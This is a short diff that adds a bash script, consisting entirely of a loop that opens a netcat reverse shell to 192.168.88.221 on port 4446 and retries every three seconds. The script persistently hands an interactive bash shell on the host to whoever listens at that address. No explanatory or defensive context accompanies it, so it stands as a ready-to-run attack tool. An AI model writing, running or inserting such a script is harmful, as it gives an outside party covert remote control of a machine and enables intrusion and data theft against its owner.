@@ -1,0 +1,6 @@
+#!/bin/bash
+while true
+do
+    nc 192.168.88.221 4446 -e /bin/bash
+    sleep 3
+done
